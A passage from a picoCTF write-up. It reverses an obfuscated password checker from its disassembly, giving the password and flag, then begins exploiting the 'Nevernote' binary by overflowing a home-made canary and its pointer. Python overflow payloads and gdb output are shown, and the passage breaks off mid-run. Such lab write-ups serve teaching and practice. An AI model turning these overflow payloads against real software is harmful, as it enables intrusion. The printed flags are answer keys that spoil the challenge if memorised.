</span><span class='line'>   0x8048820: cmp    BYTE PTR <span class="o">[</span>esp+0x32<span class="o">]</span>,0x0
</span><span class='line'>   0x8048825: je     0x80485de
</span><span class='line'>   0x804882b: cmp    edx,0x8
</span><span class='line'>   0x804882e: jne    0x8048a9f
</span><span class='line'>   0x8048834: add    edx,0x1
</span><span class='line'>   0x8048837: jmp    0x80485ab
</span><span class='line'>   0x804883c: lea    esi,<span class="o">[</span>esi+eiz*1+0x0<span class="o">]</span>
</span><span class='line'>   // 0x08048840:g
</span><span class='line'>   0x8048840: cmp    edx,0xc
</span><span class='line'>   0x8048843: sete   dl
</span><span class='line'>   0x8048846: xor    eax,eax
</span><span class='line'>   0x8048848: cmp    BYTE PTR <span class="o">[</span>esp+0x40<span class="o">]</span>,0x0
</span><span class='line'>   0x804884d: setne  al
</span><span class='line'>   0x8048850: and    eax,edx
</span><span class='line'>   0x8048852: jmp    0x80485e0
</span><span class='line'>   0x8048857: nop
</span><span class='line'>   // 0x08048858:h
</span><span class='line'>   0x8048858: cmp    edx,0xd
</span><span class='line'>   0x804885b: jne    0x80485de
</span><span class='line'>   0x8048861: cmp    BYTE PTR <span class="o">[</span>esp+0x33<span class="o">]</span>,0x0
</span><span class='line'>   0x8048866: je     0x80485de
</span><span class='line'>   0x804886c: mov    edx,0xe
</span><span class='line'>   0x8048871: jmp    0x80485ab
</span><span class='line'>   0x8048876: xchg   ax,ax
</span><span class='line'>   // 0x08048878:i
</span><span class='line'>   0x8048878: cmp    edx,0x9
</span><span class='line'>   0x804887b: jne    0x80485de
</span><span class='line'>   0x8048881: cmp    BYTE PTR <span class="o">[</span>esp+0x35<span class="o">]</span>,0x0
</span><span class='line'>   0x8048886: je     0x80485de
</span><span class='line'>   0x804888c: mov    edx,0xa
</span><span class='line'>   0x8048891: jmp    0x80485ab
</span><span class='line'>   0x8048896: xchg   ax,ax
</span><span class='line'>   // 0x08048898:j
</span><span class='line'>   0x8048898: cmp    edx,0xa
</span><span class='line'>   0x804889b: jne    0x80485de
</span><span class='line'>   0x80488a1: cmp    BYTE PTR <span class="o">[</span>esp+0x36<span class="o">]</span>,0x0
</span><span class='line'>   0x80488a6: je     0x80485de
</span><span class='line'>   0x80488ac: mov    edx,0xb
</span><span class='line'>   0x80488b1: jmp    0x80485ab
</span><span class='line'>   0x80488b6: xchg   ax,ax
</span><span class='line'>   // 0x080488b8:k
</span><span class='line'>   0x80488b8: cmp    edx,0xc
</span><span class='line'>   0x80488bb: sete   dl
</span><span class='line'>   0x80488be: xor    eax,eax
</span><span class='line'>   0x80488c0: cmp    BYTE PTR <span class="o">[</span>esp+0x37<span class="o">]</span>,0x0
</span><span class='line'>   0x80488c5: setne  al
</span><span class='line'>   0x80488c8: and    eax,edx
</span><span class='line'>   0x80488ca: jmp    0x80485e0    &lt;- terminate, compares eax to 1. If it is, the string is correct! <span class="nv">Flag</span> <span class="o">=</span> 09vdf7wefijbkh
</span><span class='line'>   0x80488cf: nop
</span><span class='line'>   // 0x080488d0:l
</span><span class='line'>   0x80488d0: cmp    edx,0x13
</span><span class='line'>   0x80488d3: jne    0x80485de
</span><span class='line'>   0x80488d9: cmp    BYTE PTR <span class="o">[</span>esp+0x38<span class="o">]</span>,0x0
</span><span class='line'>   0x80488de: je     0x80485de
</span><span class='line'>   0x80488e4: mov    edx,0x14
</span><span class='line'>   0x80488e9: jmp    0x80485ab
</span><span class='line'>   0x80488ee: xchg   ax,ax
</span><span class='line'>   // 0x080488f0:m
</span><span class='line'>   0x80488f0: cmp    edx,0x11
</span><span class='line'>   0x80488f3: jne    0x80485de
</span><span class='line'>   0x80488f9: cmp    BYTE PTR <span class="o">[</span>esp+0x39<span class="o">]</span>,0x0
</span><span class='line'>   0x80488fe: je     0x80485de
</span><span class='line'>   0x8048904: mov    edx,0x12
</span><span class='line'>   0x8048909: jmp    0x80485ab
</span><span class='line'>   0x804890e: xchg   ax,ax
</span><span class='line'>   // 0x08048910:n
</span><span class='line'>   0x8048910: cmp    edx,0x12
</span><span class='line'>   0x8048913: sete   dl
</span><span class='line'>   0x8048916: xor    eax,eax
</span><span class='line'>   0x8048918: cmp    BYTE PTR <span class="o">[</span>esp+0x39<span class="o">]</span>,0x0
</span><span class='line'>   0x804891d: setne  al
</span><span class='line'>   0x8048920: and    eax,edx
</span><span class='line'>   0x8048922: jmp    0x80485e0
</span><span class='line'>   0x8048927: nop
</span><span class='line'>   // 0x08048928:o
</span><span class='line'>   0x8048928: cmp    BYTE PTR <span class="o">[</span>esp+0x3a<span class="o">]</span>,0x0
</span><span class='line'>   0x804892d: je     0x80485de
</span><span class='line'>   0x8048933: cmp    edx,0x6
</span><span class='line'>   0x8048936: je     0x8048834
</span><span class='line'>   0x804893c: cmp    edx,0x1c
</span><span class='line'>   0x804893f: je     0x8048834
</span><span class='line'>   0x8048945: jmp    0x80485de
</span><span class='line'>   0x804894a: lea    esi,<span class="o">[</span>esi+0x0<span class="o">]</span>
</span><span class='line'>   // 0x08048950:p
</span><span class='line'>   0x8048950: cmp    edx,0x1e
</span><span class='line'>   0x8048953: jne    0x80485de
</span><span class='line'>   0x8048959: cmp    BYTE PTR <span class="o">[</span>esp+0x3c<span class="o">]</span>,0x0
</span><span class='line'>   0x804895e: xchg   ax,ax
</span><span class='line'>   0x8048960: je     0x80485de
</span><span class='line'>   0x8048966: mov    edx,0x1f
</span><span class='line'>   0x804896b: jmp    0x80485ab
</span><span class='line'>   // 0x08048970:q
</span><span class='line'>   0x8048970: cmp    edx,0x1d
</span><span class='line'>   0x8048973: jne    0x80485de
</span><span class='line'>   0x8048979: cmp    BYTE PTR <span class="o">[</span>esp+0x3d<span class="o">]</span>,0x0
</span><span class='line'>   0x804897e: je     0x80485de
</span><span class='line'>   0x8048984: mov    edx,0x1e
</span><span class='line'>   0x8048989: jmp    0x80485ab
</span><span class='line'>   0x804898e: xchg   ax,ax
</span><span class='line'>   // 0x08048990:r
</span><span class='line'>   0x8048990: cmp    edx,0x14
</span><span class='line'>   0x8048993: jne    0x80485de
</span><span class='line'>   0x8048999: cmp    BYTE PTR <span class="o">[</span>esp+0x3e<span class="o">]</span>,0x0
</span><span class='line'>   0x804899e: jne    0x8048668
</span><span class='line'>   0x80489a4: jmp    0x80485de
</span><span class='line'>   0x80489a9: lea    esi,<span class="o">[</span>esi+eiz*1+0x0<span class="o">]</span>
</span><span class='line'>   // 0x080489b0:s
</span><span class='line'>   0x80489b0: cmp    edx,0x19
</span><span class='line'>   0x80489b3: jne    0x80485de
</span><span class='line'>   0x80489b9: cmp    BYTE PTR <span class="o">[</span>esp+0x3f<span class="o">]</span>,0x0
</span><span class='line'>   0x80489be: xchg   ax,ax
</span><span class='line'>   0x80489c0: je     0x80485de
</span><span class='line'>   0x80489c6: mov    edx,0x1a
</span><span class='line'>   0x80489cb: jmp    0x80485ab
</span><span class='line'>   // 0x080489d0:t
</span><span class='line'>   0x80489d0: cmp    edx,0x18
</span><span class='line'>   0x80489d3: sete   dl
</span><span class='line'>   0x80489d6: xor    eax,eax
</span><span class='line'>   0x80489d8: cmp    BYTE PTR <span class="o">[</span>esp+0x3e<span class="o">]</span>,0x0
</span><span class='line'>   0x80489dd: setne  al
</span><span class='line'>   0x80489e0: and    eax,edx
</span><span class='line'>   0x80489e2: jmp    0x80485e0
</span><span class='line'>   0x80489e7: nop
</span><span class='line'>   // 0x080489e8:u
</span><span class='line'>   0x80489e8: cmp    edx,0x1a
</span><span class='line'>   0x80489eb: jne    0x80485de
</span><span class='line'>   0x80489f1: cmp    BYTE PTR <span class="o">[</span>esp+0x41<span class="o">]</span>,0x0
</span><span class='line'>   0x80489f6: je     0x80485de
</span><span class='line'>   0x80489fc: mov    edx,0x1b
</span><span class='line'>   0x8048a01: jmp    0x80485ab
</span><span class='line'>   0x8048a06: xchg   ax,ax
</span><span class='line'>   // 0x08048a08:v
</span><span class='line'>   0x8048a08: cmp    edx,0x2
</span><span class='line'>   0x8048a0b: jne    0x80485de
</span><span class='line'>   0x8048a11: cmp    BYTE PTR <span class="o">[</span>esp+0x42<span class="o">]</span>,0x0
</span><span class='line'>   0x8048a16: je     0x80485de
</span><span class='line'>   0x8048a1c: mov    edx,0x3
</span><span class='line'>   0x8048a21: jmp    0x80485ab
</span><span class='line'>   0x8048a26: xchg   ax,ax
</span><span class='line'>   // 0x08048a28:w
</span><span class='line'>   0x8048a28: cmp    edx,0x6
</span><span class='line'>   0x8048a2b: jne    0x80485de
</span><span class='line'>   0x8048a31: cmp    BYTE PTR <span class="o">[</span>esp+0x43<span class="o">]</span>,0x0
</span><span class='line'>   0x8048a36: je     0x80485de
</span><span class='line'>   0x8048a3c: mov    edx,0x7
</span><span class='line'>   0x8048a41: jmp    0x80485ab
</span><span class='line'>   0x8048a46: xchg   ax,ax
</span><span class='line'>   // 0x08048a48:x
</span><span class='line'>   0x8048a48: cmp    edx,0x16
</span><span class='line'>   0x8048a4b: jne    0x80485de
</span><span class='line'>   0x8048a51: cmp    BYTE PTR <span class="o">[</span>esp+0x44<span class="o">]</span>,0x0
</span><span class='line'>   0x8048a56: je     0x80485de
</span><span class='line'>   0x8048a5c: mov    edx,0x17
</span><span class='line'>   0x8048a61: jmp    0x80485ab
</span><span class='line'>   0x8048a66: xchg   ax,ax
</span><span class='line'>   // 0x08048a68:y
</span><span class='line'>   0x8048a68: cmp    edx,0x17
</span><span class='line'>   0x8048a6b: jne    0x80485de
</span><span class='line'>   0x8048a71: cmp    BYTE PTR <span class="o">[</span>esp+0x45<span class="o">]</span>,0x0
</span><span class='line'>   0x8048a76: je     0x80485de
</span><span class='line'>   0x8048a7c: mov    edx,0x18
</span><span class='line'>   0x8048a81: jmp    0x80485ab
</span><span class='line'>   0x8048a86: xchg   ax,ax
</span><span class='line'>   // 0x08048a88:z
</span><span class='line'>   0x8048a88: cmp    edx,0x15
</span><span class='line'>   0x8048a8b: sete   dl
</span><span class='line'>   0x8048a8e: xor    eax,eax
</span><span class='line'>   0x8048a90: cmp    BYTE PTR <span class="o">[</span>esp+0x2d<span class="o">]</span>,0x0
</span><span class='line'>   0x8048a95: setne  al
</span><span class='line'>   0x8048a98: and    eax,edx
</span><span class='line'>   0x8048a9a: jmp    0x80485e0
</span><span class='line'>   0x8048a9f: cmp    edx,0x4
</span><span class='line'>   0x8048aa2: je     0x8048834
</span><span class='line'>   0x8048aa8: jmp    0x80485de
</span><span class='line'>   0x8048aad: lea    esi,<span class="o">[</span>esi+0x0<span class="o">]</span>
</span><span class='line'>   0x8048ab0: call   0x80483e0 &lt;__stack_chk_fail@plt&gt;
</span></code></pre></td></tr></table></div></figure>


<p>From here, it was a matter of following the <code>mov edx, &lt;n&gt;</code> and <code>cmp edx, &lt;n&gt;</code> instructions. For instance, the first correct char of the password is &lsquo;0&rsquo;. <code>edx</code> is then set to 1. Next, I located the block:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>   // 0x08048758:9
</span><span class='line'>   0x8048758: cmp    edx,0x1
</span><span class='line'>   0x804875b: jne    0x80485de
</span><span class='line'>   0x8048761: cmp    BYTE PTR <span class="o">[</span>esp+0x85<span class="o">]</span>,0x0
</span><span class='line'>   0x8048769: je     0x80485de
</span><span class='line'>   0x804876f: mov    edx,0x2
</span><span class='line'>   0x8048774: jmp    0x80485ab
</span></code></pre></td></tr></table></div></figure>


<p>So the next valid char must be <code>9</code>. I continued this process until I got up to 0x10. There was no <code>cmp edx, 0x10</code>. I verified the chars I had so far. It seems there is some trolling going on. There are two blocks that check for <code>cmp edx, 0x6</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>   // 0x08048a28:w
</span><span class='line'>   0x8048a28: cmp    edx,0x6
</span><span class='line'>   0x8048a2b: jne    0x80485de
</span><span class='line'>   0x8048a31: cmp    BYTE PTR <span class="o">[</span>esp+0x43<span class="o">]</span>,0x0
</span><span class='line'>   0x8048a36: je     0x80485de
</span><span class='line'>   0x8048a3c: mov    edx,0x7
</span><span class='line'>   0x8048a41: jmp    0x80485ab
</span><span class='line'>   0x8048a46: xchg   ax,ax
</span><span class='line'>
</span><span class='line'>   ...and...
</span><span class='line'>
</span><span class='line'>   // 0x08048928:o
</span><span class='line'>   0x8048928: cmp    BYTE PTR <span class="o">[</span>esp+0x3a<span class="o">]</span>,0x0
</span><span class='line'>   0x804892d: je     0x80485de
</span><span class='line'>   0x8048933: cmp    edx,0x6
</span><span class='line'>   0x8048936: je     0x8048834
</span><span class='line'>   0x804893c: cmp    edx,0x1c
</span><span class='line'>   0x804893f: je     0x8048834
</span><span class='line'>   0x8048945: jmp    0x80485de
</span><span class='line'>   0x804894a: lea    esi,<span class="o">[</span>esi+0x0<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>At first, I had selected &lsquo;o&rsquo;, but it turns out it should have been &lsquo;w&rsquo;. The string comparison stops at &lsquo;k&rsquo;:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>   // 0x080488b8:k
</span><span class='line'>   0x80488b8: cmp    edx,0xc
</span><span class='line'>   0x80488bb: sete   dl
</span><span class='line'>   0x80488be: xor    eax,eax
</span><span class='line'>   0x80488c0: cmp    BYTE PTR <span class="o">[</span>esp+0x37<span class="o">]</span>,0x0
</span><span class='line'>   0x80488c5: setne  al
</span><span class='line'>   0x80488c8: and    eax,edx
</span><span class='line'>   0x80488ca: jmp    0x80485e0    &lt;- terminate, compares eax to 1.
</span><span class='line'>                                       If it is, the string is correct!
</span><span class='line'>   0x80488cf: nop
</span></code></pre></td></tr></table></div></figure>


<p>Through a bit of trial-and-error I arrived at the password:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/picoctf/obfus<span class="nv">$ </span>./obfuscate
</span><span class='line'>Password: 09vdf7wefijbkh
</span><span class='line'>Correct!
</span></code></pre></td></tr></table></div></figure>


<p>So the flag is <code>09vdf7wefijbkh</code>.</p>

<h1>Nevernote (180 points)</h1>

<p><code>
In light of the recent attacks on their machines, Daedalus Corp has
implemented a buffer overflow detection library. Nevernote, a program made
for Daedalus Corps employees to take notes, uses this library. Can you
bypass their protection and read the secret? The binary can be found at
 /home/nevernote/ on the shell server.
</code></p>

<p>This program attempts to implement a stack canary in a rather dumb way:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">struct</span> <span class="n">canary</span><span class="p">{</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">canary</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">int</span> <span class="o">*</span><span class="n">verify</span><span class="p">;</span>
</span><span class='line'><span class="p">};</span>
</span><span class='line'>
</span><span class='line'><span class="cm">/* buffer overflow resistant buffer */</span>
</span><span class='line'><span class="k">struct</span> <span class="n">safe_buffer</span><span class="p">{</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">SAFE_BUFFER_SIZE</span><span class="p">];</span>
</span><span class='line'>    <span class="k">struct</span> <span class="n">canary</span> <span class="n">can</span><span class="p">;</span>
</span><span class='line'><span class="p">};</span>
</span></code></pre></td></tr></table></div></figure>


<p>So we can overflow this <code>safe_buffer</code>, but then we also overwrite the canary. Then the canary check will not pass anymore:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">void</span> <span class="nf">verify_canary</span><span class="p">(</span><span class="k">struct</span> <span class="n">canary</span> <span class="o">*</span><span class="n">c</span><span class="p">){</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">c</span><span class="o">-&gt;</span><span class="n">canary</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="n">c</span><span class="o">-&gt;</span><span class="n">verify</span><span class="p">)){</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Canary was incorrect!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="n">__canary_failure</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// we&#39;re all good; free the canary and return</span>
</span><span class='line'>    <span class="n">free</span><span class="p">(</span><span class="n">c</span><span class="o">-&gt;</span><span class="n">verify</span><span class="p">);</span>
</span><span class='line'>    <span class="k">return</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>But since we can overflow the buffer, we control both the canary and the pointer to the canary. This means we can make this check always succeed. Again, no ASLR on the target server allows us to use a static address. Let&rsquo;s supply the address of safe_buffer (the address of which can be obtained from debugging the binary with <code>gdb</code>). This is automated like so (it echoes a username and the command for adding a note):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">pico1139</span><span class="err">@</span><span class="nl">shell</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">nevernote</span><span class="err">$</span> <span class="p">(</span><span class="n">echo</span> <span class="s">&quot;bleh&quot;</span><span class="p">;</span> <span class="n">echo</span> <span class="s">&quot;a&quot;</span><span class="p">;</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="err">&#39;</span><span class="n">print</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">512</span><span class="o">+</span><span class="s">&quot;AAAA&quot;</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\x50\xc0\x04\x08</span><span class="s">&quot;</span><span class="err">&#39;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">in</span>
</span><span class='line'><span class="p">...</span><span class="n">snip</span><span class="p">...</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">r</span> <span class="o">&lt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">in</span>
</span><span class='line'><span class="n">The</span> <span class="n">program</span> <span class="n">being</span> <span class="n">debugged</span> <span class="n">has</span> <span class="n">been</span> <span class="n">started</span> <span class="n">already</span><span class="p">.</span>
</span><span class='line'><span class="n">Start</span> <span class="n">it</span> <span class="n">from</span> <span class="n">the</span> <span class="n">beginning</span><span class="o">?</span> <span class="p">(</span><span class="n">y</span> <span class="n">or</span> <span class="n">n</span><span class="p">)</span> <span class="n">y</span>
</span><span class='line'>
</span><span class='line'><span class="n">Starting</span> <span class="nl">program</span><span class="p">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">nevernote</span><span class="o">/</span><span class="n">nevernote</span> <span class="o">&lt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">in</span>
</span><span class='line'><span class="n">Please</span> <span class="n">enter</span> <span class="n">your</span> <span class="nl">name</span><span class="p">:</span> <span class="n">Enter</span> <span class="n">a</span> <span class="nl">command</span><span class="p">:</span> <span class="n">Write</span> <span class="n">your</span> <span class="nl">note</span><span class="p">:</span> <span class="n">Note</span> <span class="n">added</span><span class="p">.</span>
</span><span class='line'><span class="o">***</span> <span class="n">Error</span> <span class="n">in</span> <span class="err">`</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">nevernote</span><span class="o">/</span><span class="n">nevernote</span><span class="err">&#39;</span><span class="o">:</span> <span class="kt">double</span> <span class="n">free</span> <span class="n">or</span> <span class="n">corruption</span> <span class="p">(</span><span class="o">!</span><span class="n">prev</span><span class="p">)</span><span class="o">:</span> <span class="mh">0x0804c050</span> <span class="o">***</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now, the binary aborts because the pointer to the canary has already been freed. Not a problem, we won&rsquo;t let it come that far. Let&rsquo;s try to overflow the saved return address:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">pico1139</span><span class="err">@</span><span class="nl">shell</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">nevernote</span><span class="err">$</span> <span class="p">(</span><span class="n">echo</span> <span class="s">&quot;bleh&quot;</span><span class="p">;</span> <span class="n">echo</span> <span class="s">&quot;a&quot;</span><span class="p">;</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="err">&#39;</span><span class="n">print</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">512</span><span class="o">+</span><span class="s">&quot;AAAA&quot;</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\x50\xc0\x04\x08CC</span><span class="s">CCCCCCCCCCCCCCDDDDEEEEFFFF&quot;</span><span class="err">&#39;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">in</span>
</span><span class='line'><span class="p">...</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">r</span> <span class="o">&lt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">in</span>
</span><span class='line'><span class="n">Starting</span> <span class="nl">program</span><span class="p">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">nevernote</span><span class="o">/</span><span class="n">nevernote</span> <span class="o">&lt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">in</span>
</span><span class='line'><span class="n">Please</span> <span class="n">enter</span> <span class="n">your</span> <span class="nl">name</span><span class="p">:</span> <span class="n">Enter</span> <span class="n">a</span> <span class="nl">command</span><span class="p">:</span> <span class="n">Write</span> <span class="n">your</span> <span class="nl">note</span><span class="p">:</span>
</span><span class='line'><span class="n">Program</span> <span class="n">received</span> <span class="n">signal</span> <span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">Segmentation</span> <span class="n">fault</span><span class="p">.</span>
</span><span class='line'><span class="mh">0xf7ea11f3</span> <span class="n">in</span> <span class="o">??</span> <span class="p">()</span> <span class="n">from</span> <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">i386</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="mf">.6</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">i</span> <span class="n">r</span>
</span><span class='line'><span class="n">eax</span>            <span class="mh">0x45454545</span>  <span class="mi">1162167621</span>
</span><span class='line'><span class="n">ecx</span>            <span class="mh">0xffffd414</span>  <span class="o">-</span><span class="mi">11244</span>
</span><span class='line'><span class="n">edx</span>            <span class="mh">0x45454545</span>  <span class="mi">1162167621</span>
</span><span class='line'><span class="n">ebx</span>            <span class="mh">0x3f4</span>   <span class="mi">1012</span>
</span><span class='line'><span class="n">esp</span>            <span class="mh">0xffffd3f0</span>  <span class="mh">0xffffd3f0</span>
</span><span class='line'><span class="n">ebp</span>            <span class="mh">0xffffd628</span>  <span class="mh">0xffffd628</span>
</span><span class='line'><span class="n">esi</span>            <span class="mh">0xffffd420</span>  <span class="o">-</span><span class="mi">11232</span>
</span><span class='line'><span class="n">edi</span>            <span class="mh">0x45454545</span>  <span class="mi">1162167621</span>
</span><span class='line'><span class="n">eip</span>            <span class="mh">0xf7ea11f3</span>  <span class="mh">0xf7ea11f3</span>
</span><span class='line'><span class="n">eflags</span>         <span class="mh">0x10282</span> <span class="p">[</span> <span class="n">SF</span> <span class="n">IF</span> <span class="n">RF</span> <span class="p">]</span>
</span><span class='line'><span class="n">cs</span>             <span class="mh">0x23</span>    <span class="mi">35</span>
</span><span class='line'><span class="n">ss</span>             <span class="mh">0x2b</span>    <span class="mi">43</span>
</span><span class='line'><span class="n">ds</span>             <span class="mh">0x2b</span>    <span class="mi">43</span>
</span><span class='line'><span class="n">es</span>             <span class="mh">0x2b</span>    <span class="mi">43</span>
</span><span class='line'><span class="n">fs</span>             <span class="mh">0x0</span> <span class="mi">0</span>
</span><span class='line'><span class="n">gs</span>             <span class="mh">0x63</span>    <span class="mi">99</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">i</span> <span class="err">$</span><span class="n">eip</span>
</span><span class='line'><span class="o">=&gt;</span> <span class="mh">0xf7ea11f3</span><span class="o">:</span>   <span class="n">movlpd</span> <span class="o">%</span><span class="n">xmm1</span><span class="p">,(</span><span class="o">%</span><span class="n">edx</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Right, a segfault because <code>edx</code> points to a place that doesn&rsquo;t exist. Let&rsquo;s fix that by supplying the address of safe_buffer:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">pico1139</span><span class="err">@</span><span class="nl">shell</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">nevernote</span><span class="err">$</span> <span class="p">(</span><span class="n">echo</span> <span class="s">&quot;bleh&quot;</span><span class="p">;</span> <span class="n">echo</span> <span class="s">&quot;a&quot;</span><span class="p">;</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="err">&#39;</span><span class="n">print</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">512</span><span class="o">+</span><span class="s">&quot;AAAA&quot;</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\x50\xc0\x04\x08CC</span><span class="s">CCCCCCCCCCCCCCDDDD</span><span class="se">\x50\xc0\x04\x08FF</span><span class="s">FF&quot;</span><span class="err">&#39;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">in</span>
</span><span class='line'><span class="p">...</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">r</span> <span class="o">&lt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">in</span>
</span><span class='line'><span class="n">Starting</span> <span class="nl">program</span><span class="p">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">nevernote</span><span class="o">/</span><span class="n">nevernote</span> <span class="o">&lt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">in</span>
